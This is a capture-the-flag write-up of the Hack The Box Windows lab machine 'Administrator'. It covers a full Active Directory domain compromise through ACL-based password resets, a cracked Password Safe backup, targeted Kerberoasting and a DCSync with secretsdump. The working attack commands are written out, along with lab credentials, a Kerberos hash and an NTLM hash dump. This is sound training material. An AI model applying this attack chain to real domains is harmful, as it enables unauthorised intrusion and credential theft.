#CTF/HTB/Windows/Medium

# Given

`Administrator` is a medium-difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. To gain access to the `michael` account, ACLs (Access Control Lists) over privileged objects are enumerated, leading us to discover that the user `olivia` has `GenericAll` permissions over `michael`, allowing us to reset his password. With access as `michael`, it is revealed that he can force a password change on the user `benjamin`, whose password is reset. This grants access to `FTP` where a `backup.psafe3` file is discovered, cracked, and reveals credentials for several users. These credentials are sprayed across the domain, revealing valid credentials for the user `emily`. Further enumeration shows that `emily` has `GenericWrite` permissions over the user `ethan`, allowing us to perform a targeted Kerberoasting attack. The recovered hash is cracked and reveals valid credentials for `ethan`, who is found to have `DCSync` rights ultimately allowing retrieval of the `Administrator` account hash and full domain compromise.

## IP

10.10.11.42

## Creds

Olivia : ichliebedich

# Writeup

## Enumeration

I started with the usual Rustscan to find out which ports could be open, and a full port scan in the background.

```shell title="nmap" fold
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-14 13:15:03Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.
htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.
htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49990/tcp open  msrpc         Microsoft Windows RPC
58537/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
58542/tcp open  msrpc         Microsoft Windows RPC
58553/tcp open  msrpc         Microsoft Windows RPC
58564/tcp open  msrpc         Microsoft Windows RPC
58600/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

The nmap scan showed me that a number of services were running on the target. Also, the host seems to be called `DC` which could mean that this is the domain controller, running Windows.

```bash title="running services"
- FTP(22)
- DNS(53)
- Kerberos(88)
- RPC(135)
- LDAP(389)
- SMB(445)
- HTTP(5985)
```

I decided to test out the services to see what I could get. I decided to use the given credentials to see what I could access.

**FTP**
![](Assets/Pasted%20image%2020250714211633.png)

**SMB**
I ran a check for Null sessions out of habit, and didn't turn up anything. 
![](Assets/Pasted%20image%2020250714212046.png)

After that, it was time to enumerate shares with the creds I had on hand. This showed me that the user olivia could read some of the shares, and that was it.

![](Assets/Pasted%20image%2020250714212137.png)

Since she could see some of the shares, I tried to see if she could enumerate users with `rid-brute`. This have me some results, and I was able to see that the domain was called `administrator.htb`. I put that in my `/etc/hosts` file along with `DC.administrator.htb` for the domain controller.

![](Assets/Pasted%20image%2020250714212418.png)

As a side note, I went ahead and used netexec to come up with the list of domain users. Just in case I had to build a list of user names to bruteforce/spray or whatever. 

**LDAP**
![](Assets/Pasted%20image%2020250714213818.png)

It was becoming more and more clear that I needed bloodhound to help me visualise the connections between all these accounts and groups. So I used the LDAP protocol and bloodhound ingestor to gather more info

![](Assets/Pasted%20image%2020250714214259.png)

I fed the ingestor data into Bloodhound, and started at Olivia. I marked her account as "owned" since we're starting with her breached creds.

![](Assets/Pasted%20image%2020250714215856.png)

Looking at the outbound connections showed me that olivia had `GenericAll` permissions over an account called michael. And michael had `ForceChangePassword` permissions over an account called benjamin, who was part of the share moderators group. 

Bloodhound gives users a pretty good idea of what kind of attack is appropriate for exploiting certain relationships in an AD environment.

## Exploitation

**Olivia -> Michael**

In order to get to michael, I would have to exploit olivia's `GenericAll` permissions. I used Samba's net tool to change michael's password.

`net rpc password "michael" "newpass2025" -U "ADMINISTRATOR"/"olivia"%"ichliebedich" -S 10.10.11.42`

I then proceeded to try to get into michel's system using `evil-winrm` .

`evil-winrm -i 10.10.11.42 -u michael -p newpass2025`

I didn't really find anything there, so I left it

![](Assets/Pasted%20image%2020250715091827.png)

 **Michael -> Benjamin**

I used the permission michael had over benjamin's account, and changed the password using the same method I used to get into Michael's account. After that I tried SMB, and evil-winrm but I didn't get anything out of either. 

I looked at FTP which was previously inaccessible with Olivia's creds. Turns out, this works and I managed to get my hands on a file called `Backup.psafe3`. 

I used `psafe2john` to dump the hash in the file, and then used John on it. At the same time, I ran Hashcat. 

`hashcat -m 5200 -a 0 -o backup.psafe.cracked Backup.psafe3 /usr/share/wordlists/rockyou.txt`

Hashcat finished first, with a password. "Password Safe" is basically a credential vault software. You install it, and then open the `Backup.psafe3` file on it. This showed me three sets of credentials. 

I used evil-winrm to test each one, and emily's worked. The user flag was on her desktop.

## Escalation to Root

Now that I got into emily's account, I need to check if I can find a way to escalate my level of access either on her system, or by getting access to a user that does have admin access. I tried to run some powershell scripts in order to see if I could 

enumerate this account, but I didn't get very far. Since this is an AD machine, I figured I'd move onto some other user accounts, that have access to the domain admin.

I decided to go back to bloodhound, and look at emily's relationships. Emily has `GenericWrite` access over Ethan.

![](Assets/Pasted%20image%2020250715123722.png)

Bloodhound suggested a targeted Kerberoast. I can possibly get a kerberos hash from this and crack it offline.

So I tried using both `targetedkerberoast.py` and `netexec`. Both worked but trying them out helped me figure out the syntax, and what it all meant. There was a clock skew error to start with but were overcome by chaining `ntpdate` or `faketime`.

![](Assets/Pasted%20image%2020250715131347.png)

![](Assets/Pasted%20image%2020250715132037.png)

The next step was to see if this hash is crackable using hashcat. It could work if the password was weak enough.

And it did work, giving me ethan's password on administrator `limpbizkit`.

Looking at the user ethan on bloodhound showed me that ethan had some permissions over the administrator user on the domain controller. The important ones are `GetChanges` and `GetChangesAll`. These two permissions give ethan the ability to execute a DCSync attack and dump the hashes for the users on the domain.

![](Assets/Pasted%20image%2020250715123621.png)

For this I went with `secretsdump.py`.

`impacket-secretsdump ADMINISTRATOR/'ethan':'limpbizkit'@ADMINISTRATOR.HTB -just-dc-ntlm`

This gave me the hashes for the users on this domain. Allowing me to grab the administrators hash

After that, it was back to evil-winrm to log in as the administrator. The root flag was on the desktop.

![](Assets/Pasted%20image%2020250715140500.png)

# Creds

## Changed Creds

michael : newpass2025

benjamin : newpass2025x

## Backup File Master Password

Backup.psafe3 : tekieromucho

## Creds from Psafe3 File

```json title="password safe creds" fold
alexander smith : {
alexander: UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
},
emily rodriguez : {
emily: UXLCI5iETUsIBoFVTj8yQFKoHjXmb
},
emma johnson: {
emma: WwANQWnmJnGV07WQN8bMS7FMAbjNur
}
```

## Ethan's Hash

```bash title="ethan's kerberos hash"
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$09a24be61215ef1ca4b78876a75a9f06$0104106e753ebf81b9e26d640f1c15c7b052cc1377a2f3f7f6c31bf6db94594a8d0ff3b101fd6e2cf319296bd9fecce
af30a32617276fc809070808723b275f2747bde2d4abeecd0b49032480d2f789f2d22ce5ecc834235158a4d13743f4e446bf5530f04756d22529846413c7ec06fa00352609ebf4eaac607747b56fb1b4a3efc2668f147e56d4afe275a4eff9
887ca384a3f31dece827f2c7379601ee89e8f3a99af03f3fd2efe04f11298899dc6a461aa52b40824eed32410eaa36be0d20724c2ab019b95c949b18755334b8d714a316c2c5c68c567a01e075aff7d013a49313a300312a01a198e45f3ff1
3f087a016e5373114d6b0a5888c6b7e24b9b53da63f23748a607132fc7af3c7a40e0e0684cce2ed8ea9370b62a7af52b5b2dc26279d57ffd9773ed1777b27d06e819daeadff9b03c36db03e2a83941e35ebd045b0f34425f16e5a34dc97126
1ba5ca23991fa7ea5fc1ec7e2a4a5c2c2bdc7a47cd2360764e2671866c772e976d338359a271b2c50fa456ffdb7ea660e8a22095c39a1238dd557f004133b86ea155399b573944520d00cd83c471e9532e675f8acccc33b9b13a9494e81413
fd4f7577505ea04434cfcf63487232755feaa250205ed7415662113419d54296dff50f08a7e656c8b28ba522a6feb4b4bf59f46185547d84c09e94230a6e230a87140f68ccc6e9ff7968ef3aa4f793e3f98028f2b85bdbd1614f2b172f6817
3d278d636284133dd284bb831a723641163f868770cf05a70837b72b0612342691affdb0a131b84285317513a0fd463dc21dc190dd94dd44e5dfffc71a5fb8eb5119d6a04527749ec48321ec45ee5f28487d66c1c23e2a5b488d06b641d035
9e02180f921d9e81af752979dfb6a1dbe67cddc782d520f58a4d9225d5767d07e65b137c6a1bf246aa17f09ef2566aaffaa53d2362909aa5eef1443d2cf6b23eb34537c2df2985c3206174bd3fc8f41cb05e09b0c9b04b9fab0be81daa7505
0d7c1400b25cc7fe56136ef6792a762014d6b654e02d036615554c8061e6822c5828f26f22849e326385df9f42fcbe7d0ff56a8cf6e21457d0bf7d0786745dbf3560cf96ada275b311c14fa1deb1e6dc847c2002c14d6a13f47a78702721d1
4571a057b08385af51862b621a0f65a02801598be345b23b9301ec5c1b93f8123778b53683586fe31ad20dd12b2bc9d0d3f0d7e472efbf0615d0a96f261c282c05b3abf7ce761fe4db5b5cf90e0a4948e9554d63d35dda0e8ae845f8e1890d
b7a48273185a7eb4e51ebcdd78fda91d921b775f15eb623ae974c56bb28779b90c9d2261f1595a417365ac7f786ec6f15b2b450ad48f73a71bae74d16911a058c4efea5f42dd5ecf070377656ad7f0307db61776cabdb1e804dd58c4c77b02
1e1dd75941e9f9da4e46c14e52cf3c42d8e9cc52e6de3f1eba112f5fa7fc21cfbc179b6173551c8a48c9a3de79708eda23d5270cc1f4d624d7534cec541722a3fa0181f1841c6e87687da4a02b05cb7205b12934173c7564020
```

## Hash Dump

```bash title="domain user hashes" fold
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:e45eabb1c7de07ec959a25560967de82:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:c44621d92c28d08c96e886280256876d:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
```